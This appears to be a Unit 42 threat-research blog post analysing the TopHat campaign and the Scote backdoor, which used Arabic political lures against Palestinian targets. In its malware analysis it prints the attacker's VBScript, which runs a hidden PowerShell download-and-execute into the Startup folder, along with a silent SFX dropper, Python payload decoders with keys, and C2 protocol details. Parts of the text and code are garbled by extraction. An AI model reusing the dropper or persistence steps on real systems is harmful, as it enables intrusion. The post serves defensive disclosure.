Blog Home (url > Unit 42 (url > The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party ServicesThe TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party ServicesBy Josh Grunzweig (url January 26, 2018 at 5:00 AM Category: Unit 42 (url Tags: Core (url DustySky (url Palestinian Territories (url Scote (url TopHat (url  7,454 (4)(url attacks-within-the-middle-east-region-using-popular-third-party- services%2F+The+TopHat+Campaign%3A+Attacks+Within+The+Middle+East+Region+Using+Popular+Third- Party+Services)  (url u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophat-campaign- attacks-within-the-middle-east-region-using-popular-third-party-services%2F)  (url mini=true&url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophat- campaign-attacks-within-the-middle-east-region-using-popular-third-party- services%2F&title=The+TopHat+Campaign%3A+Attacks+Within+The+Middle+East+Region+Using+Popular+Third- Party+Services&summary=&source=)(//www.reddit.com/submit)Summary In recent months, Palo Alto Networks Unit 42 observed a wave of attacks leveraging popular third-party services Google+, Pastebin, and bit.ly. Attackers used Arabic language decoy documents related to current events within the Palestine Territories as lures to entice victims to open and subsequently be infected by the malware. There is data indicating that these attacks are targeting individuals or organizations within the Palestinian Territories, which is detailed later. The attacks themselves are deployed via four diﬀerent means, two involving malicious RTF ﬁles, one involving self- extracting Windows executables, and the ﬁnal using RAR archives. The ultimate payload is a new malware family that we have dubbed “Scote” based on strings we found within the malware samples. Scote provides backdoor access for an attacker and we have observed it collecting command and control (C2) information from Pastebin links as well as Google+ proﬁles. The bit.ly links obscured the C2 URLs so victims could not evaluate the legitimacy of the ﬁnal site prior to clicking it. We are calling their recent activity the “TopHat” campaign. Additionally, we tracked the apparent author testing their malware against numerous security products. Our tracking of this testing enabled us to both note changes made over time as well as to observe other malware being submitted by the author. This other malware submitted provided overlaps with the previously reported DustySky campaign (url In addition to testing malicious RTFs that deploy the Scote malware family, the same attacker was witnessed submitting ﬁles that appear to be new variants of the DustySky Core malware discussed in their report. Malware Delivery Techniques The attacks we found within the TopHat campaign began in early September 2017. In a few instances, original ﬁlenames of the identiﬁed samples were written in Arabic. Speciﬁcally, we found the following names during this investigation:Original FilenameTranslationﺔﻁﻠﺳﻟﺍ ﻝﺣﺑ ﺍﺩﺑﻳ ﺱﻳﺋﺭﻟﺍ.rarﺔﻁﻠﺳﻟﺍ ﻝﺣﺑ ﺍﺩﺑﻳ ﺱﻳﺋﺭﻟﺍ.scrﻡﻭﻳﻟﺍ ﻉﺎﻣﺗﺟﺍ ﺭﺿﺣﻣ.docThe president begins dissolving power.rar The president begins dissolving power.scr Minutes of today’s meeting.docWe observed a series of techniques used to deploy the Scote malware family. To date, at a high level, we have observed the following four techniques, each of which we delve into in this blog:(url 1 Malware delivery techniquesTechnique #1 – RTFs Leveraging Bit.ly The ﬁrst technique encountered included the use of malicious RTFs that made a HTTP request to the below URL which then redirected to the below malicious site (note the intentional typo of “storage”):URL url of this year. Additionally, we see the majority of the downloads originating from both the Palestinian Territories as well as the United Arab Emirates. This provides clues as to who the victims are or where attackers may originate from.(url 2 Statistics surrounding malicious redirectTechnique #2 – Don’t Kill My Cat Attacks The second technique uses an interesting tactic that Unit 42 has not seen before. Speciﬁcally, it makes use of an attack discussed in July of this year called Don’t Kill My Cat or DKMC. DKMC can enable an attacker to load a legitimate bitmap (BMP) ﬁle that contains shellcode within it. The DKMC tool and more information about this tactic may be found here (url This speciﬁc attack begins with a malicious executable ﬁle that downloads a legitimate BMP ﬁle that looks like the following:Figure 3 Malicious BMP image retrieved by downloaderseg000:00000000 inc edx seg000:00000001 dec ebp seg000:00000002 jmp loc_34D8BIt should be noted that this is the same image used in the DKMC presentation. It would appear that the attackers simply used the default settings of this particular program. This BMP ﬁle is loaded as shellcode. The ﬁrst six bytes are read as the following instructions: Code execution is then redirected to embedded shellcode. The underlying shellcode is decrypted at runtime using a 4-byte XOR key of 0x3C0922F0. The shellcode eventually loads an embedded UPX-packed executable and redirects execution to this ﬁle. This ﬁle is an instance of the Scote malware family. The size of the payload and the fact that it is embedded within the BMP ﬁle explains the large amount of distortionwitnessed in the image above. In other words, the distortion witnessed is actually the shellcode and the embedded Scote malware. As this data is converted within a BMP image, we’re left with what essentially looks like random pixels.Technique #3 – RTFs Exploiting CVE-2017-0199. This technique begins with malicious RTF ﬁles that make use of CVE-2017-0199 (url US/security-guidance/advisory/CVE-2017-0199) a Microsoft Oﬃce/WordPad remote code execution (RCE) vulnerability patched by Microsoft in September 2017. When opened, the following lure is displayed to the victim (translation on the right provided by Google Translate):(url 4 Lure used by malicious RTFsThis lure is related to an event reported (url national-library-4816384/)in late August where President Mahmoud Abbas announced plans to convert a planned presidential palace into a national library. This is consistent with the timeline of the attacks we witnessed, as the event took place roughly a week before we observed these malware samples. These RTFs will also download a ﬁle from the following location:storgemydata[.]website/update-online/oﬃce-update.rtfNote that this is the same domain witnessed in the redirect used in technique #1. While the downloaded ﬁle has an RTF extension, it is in fact a VBScript with the following contents: 6<script language="VBScript"> window.moveTo -4000, -4000 Set vFwhEtGt = CreateObject("Wscript.Shell") Set lfTi = CreateObject("Scripting.FileSystemObject") If 1=1 Then vFwhEtGt.Run ("PowerShell.exe -WindowStyle Hidden $d=$env:userprofile+'\\start Menu\\Programs\\Startup\\\1233071870 1ac441736a55e3ee3cx996.exe';(New-Object System.Net.WebClient).DownloadFile('url art-Process $d;"),0 This VBScript script executes a PowerShell command that will download and execute a ﬁle from the following location:url ﬁnal ‘x.exe’ executable ﬁle is an instance of the Scote malware family.Technique #4 – Self-extracting Executables The last technique makes use of self-extracting executable ﬁles to both load a decoy document and spawn an instance of Scote. When the malware is run it will drop a ﬁle with an original ﬁlename of ‘abbas.rtf’, which contains the following contents:(url Figure 5 TopHat decoy document with rough translationAdditionally, an instance of Scote is loaded on the victim machine. The decoy document used discusses the potential dissolving of the Palestinian Authority (PA) by the President Mahmoud Abbas. This particular event was reported (url dissolving-pa-and-switching-power-to-plo/)on August 23, 2017, just before Trump administration oﬃcials were set to visit Ramallah. Later in this blog, we will see the attackers leveraging this Donald Trump connection even more. We originally witnessed these speciﬁc RTFs on September 6 , 2017, just two weeks after this event. Based on the observed statistics from the malicious redirect found in technique #1, as well as the content of this decoy document, we can infer that at least some of the targeted victims may very well be located in the Palestinian Territories. Analysis of the Scote Malware The Scote malware family employs a series of techniques and tricks when it is originally loaded onto a victim machine. However, underneath the various layers of obfuscation lies a fairly straightforward malware family that abuses legitimate third-party online services to host its C2 information. When Scote originally is run, it will decode embedded conﬁguration information. This embedded conﬁguration information contains URLs to third party online services, such as Pastebin postings or Google+ accounts. Scote will use this information to attempt to retrieve data from these URLS and parse it, such as in the following example:thFigure 6 Google+ proﬁle used by Scote malwareIt should be noted that a total of three Google+ proﬁles have been observed and all of these proﬁles contained the name ‘Donald Trump’. This is interesting given the topics we saw being used to deliver the Scote malware family within the TopHat campaign, many of which also referred to the President of the Palestinian Territories. After C2 information is retrieved by Scote, it will communicate with these servers and can accept commands that perform the following actions:Kill the Scote malware Run ‘ipconﬁg’ on the victim and return results Run ‘cmd.exe /C systeminfo’ and return results Load a DLL that is downloaded from a C2For more information about the Scote malware family, please refer to the Appendix. Identiﬁed Malware Testing Against Security Solutions When looking at the malicious RTF documents in technique #4 that exploit CVE-2017-0199 we found that all of the ﬁles we encountered were submitted within close succession of each other to an online service that tests them against multiple security products. Additionally, the original ﬁlenames of these ﬁles implied that an attacker may have been testing their malware against one or more security products.SHA256 15:00:08 15:00:53 15:01:49 15:05:30 15:08:32 15:18:14 other. Looking closer at these ﬁles we can see what changed between iterations.(url 7 Modiﬁcations made to RTFs by attackerAs it so happens, the ﬁrst RTF ﬁle this attacker attempted to test had very few detections. However, this was due to the fact that the attempts at commenting out the backslashes caused this ﬁle to not open at all within Microsoft Word. When you attempt to open this ﬁle, Word will simply render the content as it would a normal text ﬁle. It appeared that the attacker realized this, as he or she quickly corrected this, and proceeded to make very minor modiﬁcations to try and evade security products. However, none of the modiﬁcations were terribly eﬀective: all of these samples were found to have a high rate of detection. As we can see in Figure 7, the attacker made multiple very small modiﬁcations between each iteration, speciﬁcally around the ‘⧵object⧵objlink⧵objupdate’ string. This particular control allows the malicious content to be loaded by the RTF, as outlined in an analysis by MDSec (url As such, the attacker likely felt this was what resulted in the RTF being detected as malicious, and attempted to obfuscated it. Overlap with the DustySky Campaign Besides being able to witness the attacker testing his or her malware, we noticed something interesting when we were looking at the individual who submitted these ﬁles. About a month and a half after these ﬁles were submitted, the same individual submitted the following three samples that we attribute to the DustySky (url targets organizations within the Middle East. The group has remained active since they were originally reported on, including a campaign identiﬁed by Unit 42 earlier this year (url and-quasar-rat-used-in-recent-targeted-attacks-against-governments/). These ﬁles appear to be new variants of the DustySky Core malware discussed in the report and they communicate with the following domains over HTTPS:fulltext.yourtrap[.]com checktest.www1[.]bizThe malware is dropped via a self-extracting executable, which contains an empty decoy document with the following name:ﻥﻳﻁﺳﻠﻔﻟ ﺎﺳﻳﺋﺭ ﻥﻼﺣﺩ ﻥﻼﻋﺍﻭ ﺔﻳﺩﻭﻌﺳﻟﺍ ﻲﻓ ﺱﺎﺑﻋ ﺱﻳﺋﺭﻟﺍ ﺯﺎﺟﺗﺣﺍ ﻥﻋ ءﺎﺑﻧﺍ.docxThis can roughly be translated to the following:News of the detention of President Abbas in Saudi Arabia and Dahlan’s declaration as President of Palestine.docxAs we can see, the name of this decoy document is consistent with the lures witnessed in the TopHat campaign. Conclusion Attackers often are found to leverage current events to accomplish their goal. In the TopHat campaign, we have observed yet another instance where a threat actor looks to be using political events to target individuals or organizations within the Palestine region. This campaign leveraged multiple methods to deploy a previously unseen malware family, including some relatively new tactics in the case of using a legitimate BMP ﬁle to load malicious shellcode. The new malware family, which we have dubbed Scote, employs various tricks and tactics to evade detection, but provides relatively little functionality to the attackers once deployed. This may well be due to the fact it is still under active development. Scote uses some interesting methods when retrieving C2 information, including the use of Pastebin and Google+ accounts, as well as using bit.ly links to obscure the C2 URLs so victims could not evaluate the legitimacy of the ﬁnal site prior to clicking it. The TopHat campaign was found to have some overlaps discovered with the previously reported DustySky campaign when the attacker was identiﬁed to be submitting their ﬁles for testing purposes. Unit 42 will continue to track and monitor this threat and will report on any developments that occur. Palo Alto Networks customers are protected by this threat in the following ways:The Scote (url#/tag/Unit42.Scote) malware family and the TopHat (url#/tag/Unit42.TopHat) campaign have been tagged within AutoFocus for continued tracking DustySky (url#/tag/Unit42.DustySky) is tagged within AutoFocus for ongoing tracking All malicious domains discovered within this campaign have been appropriately ﬂagged as malware All samples are marked malicious within WildFire Traps identiﬁes and blocks the exploits used by the RTF ﬁlesAdditionally, Google, Pastebin, and bit.ly have been notiﬁed of the malicious content being hosted on their services. Appendix Indicators of CompromiseSHA256 Hashes Scote Technical Analysis following SFX script commands: 5Path=%userprofile%\start menu\programs\startup\ Setup=e.exe Update=UFor those unfamiliar with SFX commands, the series of commands above is silently deploying e.exe to the startup path. It will overwrite any instances where e.exe already exists in this path. for diﬀerent bytes to be used, the author chose to use a key of 0xFF in every observed instance. The malware proceeds to get the address of the NtDelayExecution function from ntdll.dll. This function is used by Sleep to cause a delay in program execution. After this function address has been resolved, it will overwrite the ﬁrst ﬁve bytes to jmp to a malicious function, as seen below:Figure 8 Modiﬁcations to NtDelayExeuctionThe malware proceeds to make a call to Sleep with an argument of 1, thus redirecting execution to this malicious function. This is likely an attempt at thwarting anti-virus and security solutions, however, has the adverse eﬀect of preventing the malware from making subsequent calls to Sleep. This malicious function continues to decode more strings using the single-byte XOR technique. Additionally, it will copy the following functions out of ntdll.dll for later use:ZwCreateUserProcess ZwResumeThreadA large blob of encrypted data is decrypted using a modiﬁed version of RC4. The following Python code may be used to decrypt this data. The key has consistently been observed to be “qlNwuFVA9K8HpGNY6x0I”. def rc4_crypt(data, key): S = range(256) for i in range(256): j = (j + S[i] + ord( key[i % len(key)] )) % 256 S[i] , S[j] = S[j] , S[i] for char in data: j = (S[i % 256] + j) % 256 t = S[i%256] S[i%256] = S[j] S[j] = t out.append(chr(ord(char) ^ S[(S[i%256] + S[j]) % 256])) i += 1 return ''.join(out) file = sys.argv[1] f = open(file, 'rb') fd = f.read() output = rc4_crypt(fd, "qlNwuFVA9K8HpGNY6x0I") f = open("decrypted_data.bin",'wb') f.write(output) f.close()This decrypted code is then copied to a newly allocated block of memory before execution ﬂow is redirected to it. When this newly decrypted code is called, it is provided with a string argument containing the path to svchost.exe. This new code is shellcode that will eventually decrypt an executable ﬁle and inject it into a newly spawned svchost.exe process. The shellcode in question makes certain decisions by the author that demonstrates a lack of sophistication. For example, it will load a series of libraries and functions using a common ROR13 technique. This technique begins with the attacker taking a string of a library or function, such as ‘CreateProcessA’, and performing a binary ROR13 against it. In this example, the attacker has a result of a DWORD of 0x16B3FE72. This DWORD is then typically hardcoded within the shellcode. The malicious code then iterates through the functions of the necessary library and applies the same ROR13 technique against each function until it ﬁnds a match. This shellcode uses the same approach, however, instead of providing the hardcoded DWORDs, it instead provides the clear-text library and function names, which then have the ROR13 applied. The resulting DWORD is then used. Unfortunately, this completely cancels out any obfuscation that might have originally been present. After the various libraries and functions are loaded, the shellcode decodes an embedded blob of data using a multi-byte XOR operation. The original key for this operation appears to have been ‘Houdini’, however, due to a likely mistake by the author, after the ﬁrst iteration, a key of ‘oudini⧵x00’ is used instead. The following example Python code decodes this data found within the shellcode:1 from itertools import cycle, izip def xor(message, key): return ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key))) def decode(data, size): out = "" key = "oudini\x00" b1 = xor(data[0], "H") b2 = xor(data[1:size], key) b = b1 + b2 for bite in b: out += chr((ord(bite) + 128) & 0xff) file = sys.argv[1] f = open(file, 'rb') fd = f.read() output = decode(fd, size) f1 = "embeddedShellcode.bin" fh = open(f1, 'wb') fh.write(output) fh.close()This decoded blob is a Microsoft Windows executable that contains the Scote payload. After this blob is decoded, a new instance of svchost.exe is spawned in a suspended state. The Scote payload is injected into this process prior to resuming it. Scote begins by loading and decoding an embedded resource string. It is decoded ﬁrst using base64 with a customized alphabet. The result is then base64-decoded using the traditional alphabet. The following alphabet is used for the ﬁrst phase of decoding:0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/Once decoded, we’re provided with the following conﬁguration (newlines and spacing added for presentation): [param]url [param]url [/connection] [install_name]e3HGAiPJ[/install_name] [nick_name]4c1h7vLX[/nick_name] [install_folder]noinstall[/install_folder] [reg_startup]false[/reg_startup] [folder_startup]false[/folder_startup] [task_startup]false[/task_startup] [injection]true[/injection] [injection_process]svchost[/injection_process]The conﬁguration is parsed to determine if there are any connection ‘param’ parameters provided. In the event that there are, Scote will attempt to download the contents of these URLs via a simple GET request. These pastebin URLs contained the following information, IPs have been defanged: 5.175.214[.]9:22 5.175.214[.]9:23 5.175.214[.]9:25 5.175.214[.]9:53 5.175.214[.]9:6000 5.175.214[.]9:80 5.175.214[.]9:5000 5.175.214[.]9:443 5.175.214[.]9:1434 5.175.214[.]9:110 5.175.214[.]9:2716 5.175.214[.]9:8080 9}In addition to Pastebin, some samples were found connecting to the following three Google+ proﬁles:url url url takes the response from these requests and parses data within ‘scout{}’. Other Scote versions attempted to identify data contained within ‘{x=’ and ‘}’. This data is decoded using the traditional Base64 algorithm. The results are similar to the following (IPs have been defanged): 5.175.214[.]9:22 5.175.214[.]9:23 5.175.214[.]9:5000 5.175.214[.]9:443 }This information is used for subsequent communication and these values represent the Scote malware’s C2. While there are a number of other conﬁguration parameters within Scote, the connection params and the nick_name appear to be the only ones used. It’s possible that Scote is still actively being developed and the author has yet to make use of the additional parameters provided within the conﬁguration. A full list of identiﬁed Scote conﬁgurations may be found within the ‘Scote Conﬁgurations’ appendix. Scote checks the current running process against the following list to ensure it is running within one of them:svchost.exe opera.exeScote makes an ASM call to CPUID with an argument of 1 to query the victim’s processor information and features. This information is used to generate a unique 8-character hash for that victim. Scote then connects to the previously retrieved C2 servers and sends the following information via TCP: command=scote_connection|hwid=[8 character hash] In the example above, [8 character hash] is replaced with the victim’s unique hash. Scote continues to submit the following command periodically and will parse the response: command=scote_ping Scote accepts the following ﬁve responses:Command scote_info_systeminfo Return the results of running ‘cmd.exe /CDescription No action taken by Scote Kill the Scote malware Return the results of running ‘ipconﬁg’scote_upgradesysteminfo’ Accept a DLL from the remote C2 and load it.When Scote returns information in the following format: command=[command]|buffer=[data] In the example above, [command] is replaced with the command received by the remote C2 server, and [data] is replaced with data that has been encoded using both traditional base64 as well as base64 with the nonstandard alphabet. [param]url [param]url [param]url [install_name]Kh237t0P[/install_name] [nick_name]k1et333d[/nick_name] [install_folder]noinstall[/install_folder] [reg_startup]false[/reg_startup] [folder_startup]false[/folder_startup] [task_startup]false[/task_startup] [injection]true[/injection] [injection_process]svchost[/injection_process] [param]url [param]url [param]url [/connection] [install_name]Q2xm5ziY[/install_name] [nick_name]hq5GyQ1D[/nick_name] [install_folder]noinstall[/install_folder] [reg_startup]false[/reg_startup] [folder_startup]false[/folder_startup [task_startup]false[/task_startup] [injection]false[/injection] [param]url [param]url [/connection] [install_name]e3HGAiPJ[/install_name] [nick_name]4c1h7vLX[/nick_name] [install_folder]noinstall[/install_folder] [reg_startup]false[/reg_startup] [folder_startup]false[/folder_startup] [task_startup]false[/task_startup] [injection]true[/injection] [injection_process]svchost[/injection_process] [param]url [param]url [/connection] [install_name]i0c9488I[/install_name] [nick_name]7WDyDSog[/nick_name] [install_folder]noinstall[/install_folder] [reg_startup]false[/reg_startup] [folder_startup]false[/folder_startup] [task_startup]false[/task_startup] [injection]true[/injection] [injection_process]svchost[/injection_process] [param]url [param]url [/connection] [install_name]ZVLhWo62[/install_name] [nick_name]b04bc9mK[/nick_name] [install_folder]noinstall[/install_folder] [reg_startup]false[/reg_startup] [folder_startup]false[/folder_startup] [task_startup]false[/task_startup] [injection]true[/injection] [injection_process]svchost[/injection_process] [param]url [install_name]9OhcOo03[/install_name] [nick_name]URt7b1zK[/nick_name] [install_folder]temp[/install_folder] [reg_startup]false[/reg_startup] [folder_startup]false[/folder_startup] [task_startup]true[/task_startup] [injection]true[/injection] [injection_process]svchost[/injection_process] [param]url [/connection] [install_name]ke6Wox2L[/install_name] [nick_name]3GlWhgi3[/nick_name] [install_folder]noinstall[/install_folder] [reg_startup]false[/reg_startup] [folder_startup]true[/folder_startup] [task_startup]false[/task_startup] [injection]true[/injection] [injection_process]explorer[/injection_process]97 122Got something to say?Leave a comment Notify me of followup comments via e-mailName (required)Email (required)WebsiteSUBMITSUBSCRIBE TO NEWSLETTERSEmailCOMPANY Company (url Careers (url (url Report a Vulnerability (url NOTICES Privacy Policy (url Terms of Use (url Manage Subscription (url (url  (url  (url© 2016 Palo Alto Networks, Inc. All rights reserved.SALES > 866.320.4788 SEE A DEMO TAKE A TEST DRIVE (HTTP://CONNECT.PALOALTONETWORKS.COM/VIRTUAL-UTD) 